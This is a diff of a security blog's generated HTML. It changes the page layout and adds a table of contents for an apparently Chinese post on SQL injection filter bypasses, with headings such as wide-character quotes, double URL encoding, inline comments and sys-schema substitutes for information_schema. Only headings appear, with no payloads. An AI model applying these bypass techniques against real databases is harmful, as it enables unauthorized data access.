-        <a class="extend prev" rel="prev" href="/page/3/">&lt; PREV</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/5/">NEXT &gt;</a>
-    </nav>
-    
-</main>
-            <!-- profile -->
+    <ul class="post-paginator">
+        <li class="next">
             
-            <div class="profile">
-    <img class="profile-avatar" alt="avatar" src= /avatar/haer.jpg >
-    <div class="profile-name">HacKerQWQ</div>
-    
-    <div class="profile-signature">
-        striving
-    </div>
-    
-    
-    <div class="profile-social">
-        
-    
-        
+        </li>
+        <li class="previous">
             
-                <a href="mailto:a785745707@gmail.com" class="iconfont-archer email" title=email ></a>
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2021/04/07/2021%E7%BA%A2%E6%98%8E%E8%B0%B7misc%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" title= "2021红明谷misc部分复现">
+                    <div class="prevTitle">2021红明谷misc部分复现</div>
+                </a>
             
-        
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-        
-            
-                <a href="https://github.com/HacKerQWQ" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
     
-        
-            
-                <span class="iconfont-archer wechat" title=wechat>
-                  
-                  <img class="profile-qr" src="/assets/Misaka.jpg" />
-                </span>
-            
-        
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
     
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-            
-                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
-            
-        
     
 
-    </div>
-    
-    
-        <div class="friends">
-            <div>FRIENDS</div>
-            
-                
-                    <span>
-                        <a href= //www.baidu.com target="_black">friendA</a>
-                    </span>
-                
-            
-                
-                    <span>
-                        <a href= //www.google.com target="_black">friendB</a>
-                    </span>
-                
-            
-                
-            
-        </div>
-    
-    
-        <div class="about-me">
-            <a href = "/about" >ABOUT ME</a>
-        </div>
-    
-</div>
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
             
         </div>
         <footer class="footer footer-unloaded">
@@ -888,6 +608,24 @@ Hash的特点
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">空格过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">1.1.</span> <span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.2.</span> <span class="toc-text">双空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E8%BD%A6%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">回车绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">括号绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">引号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6"><span class="toc-number">2.1.</span> <span class="toc-text">使用十六进制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E7%AC%A6"><span class="toc-number">2.2.</span> <span class="toc-text">宽字符</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%97%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">3.</span> <span class="toc-text">逗号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8from"><span class="toc-number">3.1.</span> <span class="toc-text">使用from</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#offset"><span class="toc-number">3.2.</span> <span class="toc-text">offset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join"><span class="toc-number">3.3.</span> <span class="toc-text">join</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#case-when"><span class="toc-number">3.4.</span> <span class="toc-text">case when</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%94%E8%BE%83%E5%8F%B7%E8%BF%87%E6%BB%A4-lt-gt"><span class="toc-number">4.</span> <span class="toc-text">比较号过滤(&lt;&gt;)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8greatest"><span class="toc-number">4.1.</span> <span class="toc-text">使用greatest</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strcmp"><span class="toc-number">4.2.</span> <span class="toc-text">strcmp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#in-%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">4.3.</span> <span class="toc-text">in 操作符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#between-and"><span class="toc-number">4.4.</span> <span class="toc-text">between   and</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AD%89%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">5.</span> <span class="toc-text">等号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#regexp-amp-rlike-amp-like"><span class="toc-number">5.1.</span> <span class="toc-text">regexp&amp;rlike&amp;like</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#or-and%E8%BF%87%E6%BB%A4"><span class="toc-number">6.</span> <span class="toc-text">or&#x2F;and过滤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0"><span class="toc-number">7.</span> <span class="toc-text">过滤函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%BF%E4%BB%A3"><span class="toc-number">7.1.</span> <span class="toc-text">替代</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">8.</span> <span class="toc-text">过滤关键字</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8Curl%E7%BC%96%E7%A0%81"><span class="toc-number">8.1.</span> <span class="toc-text">双url编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="toc-number">8.2.</span> <span class="toc-text">内联注释</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%86%99"><span class="toc-number">8.3.</span> <span class="toc-text">双写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99"><span class="toc-number">8.4.</span> <span class="toc-text">大小写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unicode%E5%AF%B9%E9%83%A8%E5%88%86%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">8.5.</span> <span class="toc-text">unicode对部分符号绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#if%E8%BF%87%E6%BB%A4"><span class="toc-number">9.</span> <span class="toc-text">if过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#case-when-1"><span class="toc-number">9.1.</span> <span class="toc-text">case when</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#information-schema%E8%BF%87%E6%BB%A4"><span class="toc-number">10.</span> <span class="toc-text">information_schema过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql5-7%E6%96%B0%E5%A2%9Esys-schema-auto-increment-columns"><span class="toc-number">10.1.</span> <span class="toc-text">mysql5.7新增sys.schema_auto_increment_columns</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sys-schema-table-statistics-with-buffer"><span class="toc-number">10.2.</span> <span class="toc-text">sys.schema_table_statistics_with_buffer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8EinnoDB%E6%90%BA%E5%B8%A6%E7%9A%84%E8%A1%A8"><span class="toc-number">10.3.</span> <span class="toc-text">mysql默认存储引擎innoDB携带的表</span></a></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -2623,6 +2361,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
